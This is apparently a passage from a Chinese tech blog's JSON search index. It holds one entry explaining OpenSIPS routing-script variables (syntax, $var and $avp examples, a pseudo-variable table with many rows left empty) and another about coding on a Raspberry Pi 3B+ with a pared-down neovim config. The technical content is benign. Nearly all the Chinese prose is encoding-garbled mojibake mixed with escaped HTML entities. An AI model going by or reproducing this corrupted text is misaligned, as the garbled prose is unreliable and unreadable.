å˜é‡çš„è¯»å†™æ€§è´¨ï¼šæœ‰äº›å˜é‡æ˜¯åªè¯»çš„ï¼Œæœ‰äº›å˜é‡å¯è¯»å¯å†™ å˜é‡æ˜¯å¦æœ‰å¤šä¸ªå€¼ï¼šæœ‰äº›å˜é‡åªæœ‰ä¸€ä¸ªå€¼ï¼Œæœ‰äº›å˜é‡æœ‰å¤šä¸ªå€¼ è¯­æ³• $(\u0026lt;context\u0026gt;name(subname)[index]{tramsformation}) é™¤äº†nameä»¥å¤– ï¼Œå…¶ä»–éƒ½æ˜¯å¯é€‰çš„å€¼ã€‚\nname(å¿…ä¼ )ï¼šå˜é‡åçš„ç±»å‹ï¼Œä¾‹å¦‚pvar, avp, ru, DLG_statusç­‰ç­‰ subname: å˜é‡åç§°ï¼Œä¾‹å¦‚hdr(From), avp(name) index: ç´¢å¼•ï¼ŒæŸäº›å˜é‡å¯ä»¥æœ‰å¤šä¸ªå€¼ï¼Œç±»ä¼¼äºæ•°ç»„ã€‚å¯ä»¥ç”¨ç´¢å¼•å»å¼•ç”¨å¯¹åº”çš„å…ƒç´ ã€‚ä»0å¼€å§‹ï¼Œä¹Ÿå¯ä»¥æ˜¯è´Ÿå€¼å¦‚-1, è¡¨ç¤ºå€’æ•°ç¬¬ä¸€ä¸ªã€‚ transformation: è½¬æ¢ã€‚åšä¸€äº›æ ¼å¼è½¬æ¢ï¼Œå­—ç¬¦ä¸²æˆªå–ç­‰ç­‰æ“ä½œ context: ä¸Šä¸‹æ–‡ã€‚OpenSIPæœ‰ä¸¤ä¸ªä¸Šä¸‹åˆï¼Œè¯·æ±‚requestã€ç›¸åº”replyã€‚æƒ³æƒ³ä¸€ä¸ªåœºæ™¯ï¼Œä½ åœ¨ä¸€ä¸ªç›¸åº”è·¯ç”±é‡Œå¦‚ä½•æ‹¿åˆ°è¯·æ±‚è·¯ç”±çš„æŸä¸ªå€¼å‘¢ï¼Ÿ å¯ä»¥ä½¿ç”¨$(ru). æˆ–è€…åœ¨ä¸€ä¸ªå¤±è´¥è·¯ç”±é‡Œè·å–ä¸€ä¸ªConcactçš„ä¿¡æ¯$(hdr(Contact)) ä¸¾ä¾‹ï¼š\nä»…ä»…é€šè¿‡ç±»å‹æ¥å¼•ç”¨ï¼š$ru é€šè¿‡ç±»å‹å’Œåç§°æ¥å¼•ç”¨ï¼š$hrd(Contact), å¼•ç”¨æŸä¸ªSIP headerçš„å€¼ é€šè¿‡ç±»å‹å’Œç´¢å¼•æ¥å¼•ç”¨ï¼š$(ct[0]) é€šè¿‡ç±»å‹ã€åç§°ã€ç´¢å¼•æ¥å¼•ç”¨ï¼š$(avp(addr)[0]) å˜é‡çš„ç±»å‹ è„šæœ¬å˜é‡ è„šæœ¬å˜é‡åªæœ‰ä¸€ä¸ªå€¼ è„šæœ¬å˜é‡å¯è¯»å¯å†™ è„šæœ¬å˜é‡åœ¨è·¯ç”±åŠå…¶å­è·¯ç”±ä¸­éƒ½æ˜¯å¯è§çš„ è„šæœ¬å˜é‡ä½¿ç”¨å‰åŠ¡å¿…å…ˆåˆå§‹åŒ–ï¼Œå¦åˆ™å¯èƒ½ä¼šå¼•ç”¨åˆ°ä¹‹å‰çš„å€¼ è„šæœ¬å˜é‡çš„å€¼å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯æ•´æ•°ç±»å‹ è„šæœ¬å˜é‡è¯»å†™æ¯”avpå˜é‡å¿« è„šæœ¬å˜é‡ä¼šæŒä¹…å­˜åœ¨ä¸€ä¸ªOpenSIPSè¿›ç¨‹ä¸­ å°†è„šæœ¬å˜é‡è®¾ç½®ä¸ºNULL, å®é™…ä¸Šæ˜¯å°†å˜é‡çš„å€¼è®¾ç½®ä¸º'0\u0026rsquo;, è„šæœ¬å˜é‡æ²¡æœ‰NULLå€¼ã€‚ è„šæœ¬å˜é‡ä¹‹å­˜åœ¨ä¸ä¸€ä¸ªè·¯ç”±ä¸­ ä½¿ç”¨ä¸¾ä¾‹\nroute{ $var(a) = 19 $var(a) = \u0026#34;wdd\u0026#34; $var(a) = \u0026#34;wdd\u0026#34; + \u0026#34;@\u0026#34; + $td; if(route(check_out, 1)){ xlog(\u0026#34;check error\u0026#34;); } } route[check_out]{ # æ³¨æ„ï¼Œè¿™é‡Œ$var(a)çš„å€¼å°±ä¸å­˜åœ¨äº† xlog(\u0026#34;$var(a)\u0026#34;); if ($param(1) \u0026gt; 1) { return (-1); } return(1); } avpå˜é‡ avpå˜é‡ä¸€èˆ¬ä¼šå…³è”åˆ°ä¸€ä¸ªsipæ¶ˆæ¯æˆ–è€…SIPäº‹åŠ¡ä¸Š. avpå˜é‡å¯ä»¥æœ‰å¤šä¸ªå€¼ å¯ä»¥avpå˜é‡ç†è§£æˆä¸€ä¸ªåè¿›å…ˆå‡ºçš„æ ˆ æ‰€æœ‰å¤„ç†è¿™ä¸ªæ¶ˆæ¯çš„å­è·¯ç”±éƒ½å¯ä»¥è·å¾—avpçš„å˜é‡ã€‚ä½†æ˜¯å¦‚æœæƒ³åœ¨å“åº”è·¯ç”±ä¸­æƒ³è·å–è¯·æ±‚è·¯ç”±ä¸­çš„avpå˜é‡ï¼Œåˆ™éœ€è¦è®¾ç½®TMæ¨¡å—çš„onreply_avp_modeå‚æ•°ï¼šmodparam(\u0026quot;tm\u0026quot;,\u0026quot;onreply_avp_mode\u0026quot;, 1) $avp(trunk)=\u0026#34;hello\u0026#34;; $avp(trunk)=\u0026#34;duan\u0026#34;; $avp(trunk)=\u0026#34;hi\u0026#34;; # å¯ä»¥æŠŠtrunkçš„å€¼ç†è§£æˆä¸‹é¢çš„æ ·å­ # hi -\u0026gt; duan -\u0026gt; hello xlog(\u0026#34;$avp(trunk)\u0026#34;); è¿™é‡Œåªèƒ½æ‰“å°å‡ºhi xlog(\u0026#34;$(avp(trunk)[2])\u0026#34;); è¿™é‡Œèƒ½æ‰“å°hello $avp(trunk)=NULL; è¿™é‡Œèƒ½åˆ é™¤æœ€åçš„ä¸€ä¸ªå€¼ï¼Œå¦‚æœåªæœ‰ä¸€ä¸ªå€¼ï¼Œé‚£ä¹ˆæ•´ä¸ªavpä¼šè¢«åˆ é™¤ avp_delete(\u0026#34;$avp(trunk)/g\u0026#34;); # åˆ é™¤avpæ‰€æœ‰çš„å€¼ï¼ŒåŒ…æ‹¬è¿™ä¸ªavpè‡ªèº«ã€‚ $(avp(trunk)[1])=\u0026#34;heihei\u0026#34;; é‡æ–°èµ‹å€¼ $(avp(trunk)[1])=NULL; åˆ é™¤æŸä¸€ä¸ªå€¼ ä¼ªå˜é‡ ä¼ªå˜é‡ä¸»è¦æ˜¯å¯¹SIPæ¶ˆæ¯çš„å„ä¸ªéƒ¨åˆ†è¿›è¡Œå¼•ç”¨çš„\nå¤§éƒ¨åˆ†ä¼ªå˜é‡å¾ˆå¥½æ¥ï¼Œéƒ½æ˜¯ç¼©å†™çš„å•è¯çš„é¦–å­—æ¯ã€‚\nä¼ªå˜é‡ä»¥$å¼€å¤´ï¼ŒåŠ sipæ¶ˆæ¯å­—æ®µçš„ç¼©å†™ï¼Œä¾‹å¦‚$ci, ä»£è¡¨sip callID åºå· åç§° æ˜¯å¦å¯ä¿®æ”¹ å«ä¹‰ 1 $ai å¼•ç”¨P-Asserted-Identifyå¤´çš„url 2 $adu Authentication Digest URI 3 $ar Authentication realm 4 $au Auth username user 5 $ad Auth username domain 6 $an Auth nonce 7 $auth.resp Auth response 8 $auth.nonce Auth nonce 9 $auth.opaque the opaque å­—ç¬¦ä¸² 10 $auth.alg è®¤è¯ç®—æ³• 11 $auth.qop qopå‚æ•°çš„å€¼ 12 $auth.nc nonce countå‚æ•° 13 $aU æ•´ä¸ªusername 14 $Au è®¡è´¹ç”¨çš„è´¦æˆ·åï¼Œä¸»è¦æ˜¯accä¼šç”¨ 15 $argv è·å–é€šè¿‡å‘½ä»¤è¡Œå‚æ•°è®¾ç½®å‚æ•°-oã€‚ä¾‹å¦‚åœ¨å¯åŠ¨opensipsæ—¶```bash opensips -o maxsiplength=1200 \u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;åœ¨è„šæœ¬é‡Œå°±å¯ä»¥é€šè¿‡$argv(maxsiplength)\u0026lt;br /\u0026gt;```bash xlog(\u0026#34;maxsiplength: is $argv(maxsiplength)\u0026#34;) | | 16 | $af | | ipåè®®ï¼Œå¯èƒ½æ˜¯INET(ipv4), æˆ–è€…æ˜¯INET6(ipv6) | | 17 | $branch | | ç”¨æ¥åˆ›å»ºæ–°çš„åˆ†æ”¯```bash $branch=\u0026ldquo;sip:new#domain\u0026rdquo;;\n| | 18 | $branch() | | \u0026lt;br /\u0026gt;- $branch(uri)\u0026lt;br /\u0026gt;- $branch(duri)\u0026lt;br /\u0026gt;- $branch(q)\u0026lt;br /\u0026gt;- $branch(path)\u0026lt;br /\u0026gt;- $branch(flags)\u0026lt;br /\u0026gt;- $branch(socket)\u0026lt;br /\u0026gt; | | 19 | **$ci** | | å¼•ç”¨sip call-idã€‚ (call-id) | | 20 | **$cl** | | å¼•ç”¨sip bodyéƒ¨åˆ†çš„é•¿åº¦ã€‚(content-length) | | 21 | $cs | | å¼•ç”¨ cseq number | | 22 | $ct | | å¼•ç”¨Contact\u0026lt;br /\u0026gt;- $ci\u0026lt;br /\u0026gt;- $(ct[n])\u0026lt;br /\u0026gt;- $(ct[-n])\u0026lt;br /\u0026gt; | | 23 | $ct.fields() | \u0026lt;br /\u0026gt; | \u0026lt;br /\u0026gt;- $ct.fields(name)\u0026lt;br /\u0026gt;- $ct.fields(uri)\u0026lt;br /\u0026gt;- $ct.fields(q)\u0026lt;br /\u0026gt;- $ct.fields(expires)\u0026lt;br /\u0026gt;- $ct.fields(methods)\u0026lt;br /\u0026gt;- $ct.fields(received)\u0026lt;br /\u0026gt;- $ct.fields(params) æ‰€æœ‰çš„å‚æ•°\u0026lt;br /\u0026gt; | | 24 | $cT | | \u0026lt;br /\u0026gt;- $cT Content-Type\u0026lt;br /\u0026gt;- $(cT[n])\u0026lt;br /\u0026gt;- $(cT[-n])\u0026lt;br /\u0026gt;- $(cT[*])\u0026lt;br /\u0026gt; | | 25 | **$dd** | | å¼•ç”¨ç›®æ ‡urlé‡Œé¢çš„domainéƒ¨åˆ† | | 26 | $di | | diversion header | | 27 | $dip | | diversion privacy prameter | | 29 | $dir | | diversion reason parameter | | 30 | $dp | | ç›®æ ‡urlçš„ç«¯å£å·éƒ¨åˆ† (destionation port) | | 31 | $dP | | ç›®æ ‡urlçš„ä¼ è¾“åè®®éƒ¨åˆ† (destionation protocol) | | 32 | $ds | | destionation set | | 33 | **$du** | | å¼•ç”¨ destionation url | | 34 | $err.class | | é”™è¯¯çš„ç±»åˆ«\u0026lt;br /\u0026gt;- 1 è§£æé”™è¯¯\u0026lt;br /\u0026gt; | | 35 | $err.level | | é”™è¯¯çš„çº§åˆ« | | 36 | $err.info | | é”™è¯¯ä¿¡æ¯çš„æè¿° | | 37 | $err.rcode | | error reply code | | 38 | $err.rreason | | error reply reason | | 39 | **$fd** | | From URI domain | | 40 | **$fn** | | From display name | | 41 | **$fs** | | å¼ºåˆ¶ä½¿ç”¨æŸä¸ªåœ°å€å‘é€æ¶ˆæ¯ã€‚ (forced socket)\u0026lt;br /\u0026gt;æ ¼å¼ï¼šproto:ip:port | | 42 | $ft | | From tag | | 43 | **$fu** | | From URL | | 44 | **$fU** | | username in From URL | | 45 | **$log_level** | | å¯ä»¥ç”¨æ¥åŠ¨æ€ä¿®æ”¹æ—¥å¿—çº§åˆ«\u0026lt;br /\u0026gt;$log_level=4;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;$log_level=NULL; æ¢å¤é»˜è®¤å€¼ | | 46 | $mb | | sip message buffer | | 47 | $mf | | message flags | | 48 | $mi | | sip message id | | 49 | **$ml** | | sip message length | | 50 | $od | | domain in original R-URI | | 51 | $op | | port in original R-URI | | 52 | $oP | | transport protocol of original R-URI | | 53 | $ou | | original URI | | 54 | $oU | | username in original URI | | 55 | **$param(idx)** | | å¼•ç”¨è·¯ç”±å‚æ•°ï¼Œä»1å¼€å§‹\u0026lt;br /\u0026gt;```bash route{ route(R_NAME, $var(debug), \u0026#34;pp\u0026#34;); } route[R_NAME]{ $param(1); #å¼•ç”¨ç¬¬ä¸€ä¸ªå‚æ•° $var(debug) $param(2); #å¼•ç”¨ç¬¬äºŒä¸ªå‚æ•° pp } | | 56 | $pd | | domain in sip P-Prefered-Identify header | | 57 | $pn | | display name in sip P-Prefered-Identify header | | 58 | $pp | | process id | | 59 | $pr $proto | | æ¥å—æ¶ˆæ¯çš„åè®® UDP, TCP, TLS, SCTP, WS | | 60 | $pu | | URL in sip P-Prefered-Identify header | | 61 | $rd | | domain in request url | | 62 | $rb | | body of request/replay- $rb- $(rb[*])- $(rb[n])- $(rb[-n])- $rb(application/sdp)- $rb(application/isup) | | 63 | $rc $retcode | | ä¸Šä¸ªå‡½æ•°çš„è¿”å›ç»“æœ | | 64 | $re | | remote-party-id | | 65 | $rm | | sip method | | 66 | $rp | | port of R-RUI | | 67 | $rP | | transport protocol pf R-URI | | 68 | $rr | | reply reason | | 69 | $rs | | reply status | | 70 | $ru | | request url | | 71 | $rU | | | | 72 | $ru_q | | | | 73 | $Ri | | | | 74 | $Rp | | | | 75 | $sf | | | | 76 | $si | | | | 77 | $sp | | | | 78 | $tt | | | | 79 | $tu | | | | 80 | $tU | | | | 81 | $time(format) | | | | 82 | $T_branch_idx | | | | 83 | $Tf | | | | 84 | $Ts | | | | 85 | $Tsm | | | | 86 | $TS | | | | 87 | $ua | | | | 88 | $(hdr(name)[N]) | | | | 89 | $rT | | | | 90 | $cfg_line $cfg_file | | | | 91 | $xlog_level | | |\n","permalink":"https://wdd.js.org/opensips/ch5/core-var-2/","summary":"ç®€ä»‹ OpenSIPSçš„è·¯ç”±è„šæœ¬æä¾›äº†å‡ ç§ä¸åŒç±»å‹çš„å˜é‡ã€‚ä¸åŒç±»å‹çš„å˜é‡æœ‰ä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„å·®å¼‚ã€‚\nå˜é‡çš„å¯è§æ€§ å˜é‡å¼•ç”¨çš„å€¼ å˜é‡çš„è¯»å†™æ€§è´¨ï¼šæœ‰äº›å˜é‡æ˜¯åªè¯»çš„ï¼Œæœ‰äº›å˜é‡å¯è¯»å¯å†™ å˜é‡æ˜¯å¦æœ‰å¤šä¸ªå€¼ï¼šæœ‰äº›å˜é‡åªæœ‰ä¸€ä¸ªå€¼ï¼Œæœ‰äº›å˜é‡æœ‰å¤šä¸ªå€¼ è¯­æ³• $(\u0026lt;context\u0026gt;name(subname)[index]{tramsformation}) é™¤äº†nameä»¥å¤– ï¼Œå…¶ä»–éƒ½æ˜¯å¯é€‰çš„å€¼ã€‚\nname(å¿…ä¼ )ï¼šå˜é‡åçš„ç±»å‹ï¼Œä¾‹å¦‚pvar, avp, ru, DLG_statusç­‰ç­‰ subname: å˜é‡åç§°ï¼Œä¾‹å¦‚hdr(From), avp(name) index: ç´¢å¼•ï¼ŒæŸäº›å˜é‡å¯ä»¥æœ‰å¤šä¸ªå€¼ï¼Œç±»ä¼¼äºæ•°ç»„ã€‚å¯ä»¥ç”¨ç´¢å¼•å»å¼•ç”¨å¯¹åº”çš„å…ƒç´ ã€‚ä»0å¼€å§‹ï¼Œä¹Ÿå¯ä»¥æ˜¯è´Ÿå€¼å¦‚-1, è¡¨ç¤ºå€’æ•°ç¬¬ä¸€ä¸ªã€‚ transformation: è½¬æ¢ã€‚åšä¸€äº›æ ¼å¼è½¬æ¢ï¼Œå­—ç¬¦ä¸²æˆªå–ç­‰ç­‰æ“ä½œ context: ä¸Šä¸‹æ–‡ã€‚OpenSIPæœ‰ä¸¤ä¸ªä¸Šä¸‹åˆï¼Œè¯·æ±‚requestã€ç›¸åº”replyã€‚æƒ³æƒ³ä¸€ä¸ªåœºæ™¯ï¼Œä½ åœ¨ä¸€ä¸ªç›¸åº”è·¯ç”±é‡Œå¦‚ä½•æ‹¿åˆ°è¯·æ±‚è·¯ç”±çš„æŸä¸ªå€¼å‘¢ï¼Ÿ å¯ä»¥ä½¿ç”¨$(ru). æˆ–è€…åœ¨ä¸€ä¸ªå¤±è´¥è·¯ç”±é‡Œè·å–ä¸€ä¸ªConcactçš„ä¿¡æ¯$(hdr(Contact)) ä¸¾ä¾‹ï¼š\nä»…ä»…é€šè¿‡ç±»å‹æ¥å¼•ç”¨ï¼š$ru é€šè¿‡ç±»å‹å’Œåç§°æ¥å¼•ç”¨ï¼š$hrd(Contact), å¼•ç”¨æŸä¸ªSIP headerçš„å€¼ é€šè¿‡ç±»å‹å’Œç´¢å¼•æ¥å¼•ç”¨ï¼š$(ct[0]) é€šè¿‡ç±»å‹ã€åç§°ã€ç´¢å¼•æ¥å¼•ç”¨ï¼š$(avp(addr)[0]) å˜é‡çš„ç±»å‹ è„šæœ¬å˜é‡ è„šæœ¬å˜é‡åªæœ‰ä¸€ä¸ªå€¼ è„šæœ¬å˜é‡å¯è¯»å¯å†™ è„šæœ¬å˜é‡åœ¨è·¯ç”±åŠå…¶å­è·¯ç”±ä¸­éƒ½æ˜¯å¯è§çš„ è„šæœ¬å˜é‡ä½¿ç”¨å‰åŠ¡å¿…å…ˆåˆå§‹åŒ–ï¼Œå¦åˆ™å¯èƒ½ä¼šå¼•ç”¨åˆ°ä¹‹å‰çš„å€¼ è„šæœ¬å˜é‡çš„å€¼å¯ä»¥æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥æ˜¯æ•´æ•°ç±»å‹ è„šæœ¬å˜é‡è¯»å†™æ¯”avpå˜é‡å¿« è„šæœ¬å˜é‡ä¼šæŒä¹…å­˜åœ¨ä¸€ä¸ªOpenSIPSè¿›ç¨‹ä¸­ å°†è„šæœ¬å˜é‡è®¾ç½®ä¸ºNULL, å®é™…ä¸Šæ˜¯å°†å˜é‡çš„å€¼è®¾ç½®ä¸º'0\u0026rsquo;, è„šæœ¬å˜é‡æ²¡æœ‰NULLå€¼ã€‚ è„šæœ¬å˜é‡ä¹‹å­˜åœ¨ä¸ä¸€ä¸ªè·¯ç”±ä¸­ ä½¿ç”¨ä¸¾ä¾‹\nroute{ $var(a) = 19 $var(a) = \u0026#34;wdd\u0026#34; $var(a) = \u0026#34;wdd\u0026#34; + \u0026#34;@\u0026#34; + $td; if(route(check_out, 1)){ xlog(\u0026#34;check error\u0026#34;); } } route[check_out]{ # æ³¨æ„ï¼Œè¿™é‡Œ$var(a)çš„å€¼å°±ä¸å­˜åœ¨äº† xlog(\u0026#34;$var(a)\u0026#34;); if ($param(1) \u0026gt; 1) { return (-1); } return(1); } avpå˜é‡ avpå˜é‡ä¸€èˆ¬ä¼šå…³è”åˆ°ä¸€ä¸ªsipæ¶ˆæ¯æˆ–è€…SIPäº‹åŠ¡ä¸Š.","title":"æ ¸å¿ƒå˜é‡è§£è¯»-100%"},{"content":"é…ç½® æ ‘è“æ´¾3B+çš„é…ç½®\n4æ ¸1G CPU ARMv7 Processor 64G SDå¡ å¸¸ç”¨è½¯ä»¶ neovim LXTerminalç»ˆç«¯ chromeæµè§ˆå™¨ è°·æ­Œæ‹¼éŸ³è¾“å…¥æ³• å¸¸ç”¨è¯­è¨€ golang c nodejs å¤–è®¾ é”®ç›˜é¼ æ ‡ï¼š é›·æŸ æ— çº¿æœºæ¢°é”®ç›˜åŠ é¼ æ ‡ 150å—å·¦å³ å±å¹•ï¼šä¸€å—ipadå¤§å°å¤–æ¥å±å¹•ï¼Œ400å—å·¦å³ å¸¸ç”¨å·¥ä½œ Golang UDP Serverå¼€å‘ï¼Œ æ€»ä½“è¿˜ç®—æµç•…ã€‚å‰ææ—¶ä¸è¦åŠ è½½å¤ªå¤šçš„neovimæ’ä»¶ï¼Œç‰¹åˆ«è±¡coc-vim, go-vimç­‰æ’ä»¶ï¼Œå®‰è£…è¿‡åè®©ä½ å¡çš„ç»æœ›ã€‚æ¯æ¬¡å½“æˆ‘ç»æœ›ä¹‹æ—¶ï¼Œæˆ‘å°±å…³é—­äº†å›¾å½¢ç•Œé¢ï¼Œå›åˆ°ç»ˆç«¯ç»§ç»­å¹²æ´»ã€‚ä½†æ˜¯å³ä½¿ä½¿ç”¨çº¯æ–‡æœ¬æ–¹å¼ç™»å½•ï¼Œè¿è¡Œvimè¿˜æ˜¯å¾ˆå¡ã€‚ åæ¥æˆ‘åœ¨macbook proä¸Šä¹Ÿç”¨neovimå¼€å‘ï¼Œå‘ç°ä¹Ÿæ˜¯å¾ˆå¡ã€‚äºæ˜¯æˆ‘å°±é‡Šç„¶äº†ï¼Œ9åƒå¤šçš„macbookéƒ½å¡ï¼Œ300å¤šçš„æ ‘è“æ´¾å¡ä¸€ç‚¹æ€ä¹ˆäº†ï¼ ä½†æ˜¯å¡é¡¿è¿˜æ˜¯éå¸¸å½±å“å¿ƒæƒ…çš„ï¼Œäºæ˜¯æˆ‘å°±å¤§é‡ç²¾ç®€vimçš„æ’ä»¶ã€‚ æˆ‘åŸºæœ¬ä¸Šå°±ç”¨ä¸¤ä¸ªæ’ä»¶ï¼Œéƒ½æ˜¯å’ŒçŠ¶æ€æ æœ‰å…³çš„ã€‚å…¶ä»–åäºŒä¸ªæ’ä»¶éƒ½ç»™æ³¨é‡Šæ‰äº† call plug#begin(\u0026#39;~/.vim/plugged\u0026#39;) Plug \u0026#39;vim-airline/vim-airline\u0026#39; Plug \u0026#39;vim-airline/vim-airline-themes\u0026#39; Plug \u0026#39;jiangmiao/auto-pairs\u0026#39; \u0026#34;Plug \u0026#39;yonchu/accelerated-smooth-scroll\u0026#39; \u0026#34;Plug \u0026#39;preservim/tagbar\u0026#39;, { \u0026#39;for\u0026#39;: [\u0026#39;go\u0026#39;, \u0026#39;c\u0026#39;]} \u0026#34;Plug \u0026#39;airblade/vim-gitgutter\u0026#39; \u0026#34;Plug \u0026#39;fatih/vim-go\u0026#39;, { \u0026#39;do\u0026#39;: \u0026#39;:GoUpdateBinaries\u0026#39;, \u0026#39;for\u0026#39;: \u0026#39;go\u0026#39; } \u0026#34;Plug \u0026#39;dense-analysis/ale\u0026#39; \u0026#34;Plug \u0026#39;vim-scripts/matchit.zip\u0026#39; \u0026#34;Plug \u0026#39;pangloss/vim-javascript\u0026#39;, {\u0026#39;for\u0026#39;:\u0026#39;javascript\u0026#39;} \u0026#34;Plug \u0026#39;leafgarland/typescript-vim\u0026#39; \u0026#34;Plug \u0026#39;neoclide/coc.nvim\u0026#39;, {\u0026#39;branch\u0026#39;: \u0026#39;release\u0026#39;} \u0026#34;Plug \u0026#39;jremmen/vim-ripgrep\u0026#39; \u0026#34;Plug \u0026#39;plasticboy/vim-markdown\u0026#39; \u0026#34;Plug \u0026#39;mzlogin/vim-markdown-toc\u0026#39; call plug#end() filetype plugin indent on filetype plugin on filetype indent on set guicursor= set history=1000 let g:netrw_banner=0 let g:ale_linters = { \\ \u0026#39;javascript\u0026#39;: [\u0026#39;standard\u0026#39;], \\ \u0026#39;typescript\u0026#39;: [\u0026#39;tsserver\u0026#39;] \\} let g:ale_fixers = {\u0026#39;javascript\u0026#39;: [\u0026#39;standard\u0026#39;]} let g:ale_lint_on_save = 1 let g:ale_fix_on_save = 1 let g:ale_typescript_tsserver_executable=\u0026#39;tsserver\u0026#39; let g:airline#extensions#tabline#enabled = 1 let g:ale_set_loclist = 0 let g:ale_set_quickfix = 1 let g:ale_open_list = 0 let g:vim_markdown_folding_disabled = 1 let g:vmt_cycle_list_item_markers = 1 let g:tagbar_sort = 0 \u0026#34; colorscheme codedark \u0026#34; let g:airline_theme = \u0026#39;codedark\u0026#39; \u0026#34; \u0026#34; buffer let mapleader = \u0026#34;,\u0026#34; nnoremap \u0026lt;Leader\u0026gt;j :bp\u0026lt;CR\u0026gt; \u0026#34; previous buffer nnoremap \u0026lt;Leader\u0026gt;k :bn\u0026lt;CR\u0026gt; \u0026#34; next buffer nnoremap \u0026lt;Leader\u0026gt;n :bf\u0026lt;CR\u0026gt; \u0026#34; previous buffer nnoremap \u0026lt;Leader\u0026gt;m :bl\u0026lt;CR\u0026gt; \u0026#34; next buffer nnoremap \u0026lt;Leader\u0026gt;l :b#\u0026lt;CR\u0026gt; \u0026#34; previous buffer nnoremap \u0026lt;Leader\u0026gt;e :e\u0026lt;CR\u0026gt; \u0026#34; open netrw nnoremap \u0026lt;Leader\u0026gt;d :bd\u0026lt;CR\u0026gt; \u0026#34; close buffer nnoremap \u0026lt;Leader\u0026gt;g :!go fmt %\u0026lt;CR\u0026gt; \u0026#34; go fmt current file nnoremap \u0026lt;Leader\u0026gt;tm :%s/\\s\\+$//e\u0026lt;CR\u0026gt; \u0026#34; trim space at endofline nnoremap \u0026lt;Leader\u0026gt;a A nnoremap \u0026lt;Leader\u0026gt;w :w\u0026lt;CR\u0026gt; nnoremap \u0026lt;Leader\u0026gt;c :clo\u0026lt;CR\u0026gt; nnoremap \u0026lt;Leader\u0026gt;/ :Rg\u0026lt;Space\u0026gt; inoremap jj \u0026lt;ESC\u0026gt; highlight CocErrorFloat ctermfg=White let g:netrw_list_hide= \u0026#39;.*\\.swp$\u0026#39; let g:ctrlp_custom_ignore = { \\ \u0026#39;dir\u0026#39;: \u0026#39;\\v[\\/]\\.?(git|hg|svn|node_modules)$\u0026#39;, \\ \u0026#39;file\u0026#39;: \u0026#39;\\v\\.(exe|so|dll|min.js)$\u0026#39;, \\ \u0026#39;link\u0026#39;: \u0026#39;some_bad_symbolic_links\u0026#39;, \\ } set autoread \u0026#34; au CursorHold,CursorHoldI * :e \u0026#34; au FocusGained,BufEnter * :e set so=7 set ruler set cmdheight=2 set hid set backspace=eol,start,indent set whichwrap+=\u0026lt;,\u0026gt;,h,l set ignorecase set smartcase set hlsearch set incsearch set showmatch set mat=2 syntax enable set background=dark set ffs=unix,dos,mac \u0026#34;set ai \u0026#34;Auto indent \u0026#34;set si \u0026#34;Smart indent set wrap \u0026#34;Wrap lines set cursorline set tabstop=4 set shiftwidth=4 set expandtab set background=dark \u0026#34; colorscheme solarized \u0026#34; let g:ackprg = \u0026#39;rg --vimgrep --type-not sql --smart-case\u0026#39; map ; : autocmd FileType javascript setlocal ts=2 sts=2 shiftwidth=2 ä½†æ˜¯æ²¡æœ‰go-vimå†™golangè¿˜æ˜¯ä¸å¤ªæ–¹ä¾¿çš„ï¼Œç‰¹åˆ«æ˜¯ä¿å­˜çš„æ—¶å€™æ ¼å¼åŒ–ï¼Œä½†æ˜¯ä¹Ÿæœ‰æ–¹æ¡ˆ, æ‰§è¡Œvimçš„Exå‘½ä»¤ï¼Œï¼š!go fmt % è§†é¢‘ çœ‹è§†é¢‘æ˜¯éå¸¸å±é™©çš„è¡Œä¸ºï¼Œæœ‰å¯èƒ½éœ€è¦å¼ºåˆ¶å…³æœºé‡å¯ã€‚ ","permalink":"https://wdd.js.org/posts/2021/08/mlg4mt/","summary":"é…ç½® æ ‘è“æ´¾3B+çš„é…ç½®\n4æ ¸1G CPU ARMv7 Processor 64G SDå¡ å¸¸ç”¨è½¯ä»¶ neovim LXTerminalç»ˆç«¯ chromeæµè§ˆå™¨ è°·æ­Œæ‹¼éŸ³è¾“å…¥æ³• å¸¸ç”¨è¯­è¨€ golang c nodejs å¤–è®¾ é”®ç›˜é¼ æ ‡ï¼š é›·æŸ æ— çº¿æœºæ¢°é”®ç›˜åŠ é¼ æ ‡ 150å—å·¦å³ å±å¹•ï¼šä¸€å—ipadå¤§å°å¤–æ¥å±å¹•ï¼Œ400å—å·¦å³ å¸¸ç”¨å·¥ä½œ Golang UDP Serverå¼€å‘ï¼Œ æ€»ä½“è¿˜ç®—æµç•…ã€‚å‰ææ—¶ä¸è¦åŠ è½½å¤ªå¤šçš„neovimæ’ä»¶ï¼Œç‰¹åˆ«è±¡coc-vim, go-vimç­‰æ’ä»¶ï¼Œå®‰è£…è¿‡åè®©ä½ å¡çš„ç»æœ›ã€‚æ¯æ¬¡å½“æˆ‘ç»æœ›ä¹‹æ—¶ï¼Œæˆ‘å°±å…³é—­äº†å›¾å½¢ç•Œé¢ï¼Œå›åˆ°ç»ˆç«¯ç»§ç»­å¹²æ´»ã€‚ä½†æ˜¯å³ä½¿ä½¿ç”¨çº¯æ–‡æœ¬æ–¹å¼ç™»å½•ï¼Œè¿è¡Œvimè¿˜æ˜¯å¾ˆå¡ã€‚ åæ¥æˆ‘åœ¨macbook proä¸Šä¹Ÿç”¨neovimå¼€å‘ï¼Œå‘ç°ä¹Ÿæ˜¯å¾ˆå¡ã€‚äºæ˜¯æˆ‘å°±é‡Šç„¶äº†ï¼Œ9åƒå¤šçš„macbookéƒ½å¡ï¼Œ300å¤šçš„æ ‘è“æ´¾å¡ä¸€ç‚¹æ€ä¹ˆäº†ï¼ ä½†æ˜¯å¡é¡¿è¿˜æ˜¯éå¸¸å½±å“å¿ƒæƒ…çš„ï¼Œäºæ˜¯æˆ‘å°±å¤§é‡ç²¾ç®€vimçš„æ’ä»¶ã€‚ æˆ‘åŸºæœ¬ä¸Šå°±ç”¨ä¸¤ä¸ªæ’ä»¶ï¼Œéƒ½æ˜¯å’ŒçŠ¶æ€æ æœ‰å…³çš„ã€‚å…¶ä»–åäºŒä¸ªæ’ä»¶éƒ½ç»™æ³¨é‡Šæ‰äº† call plug#begin(\u0026#39;~/.vim/plugged\u0026#39;) Plug \u0026#39;vim-airline/vim-airline\u0026#39; Plug \u0026#39;vim-airline/vim-airline-themes\u0026#39; Plug \u0026#39;jiangmiao/auto-pairs\u0026#39; \u0026#34;Plug \u0026#39;yonchu/accelerated-smooth-scroll\u0026#39; \u0026#34;Plug 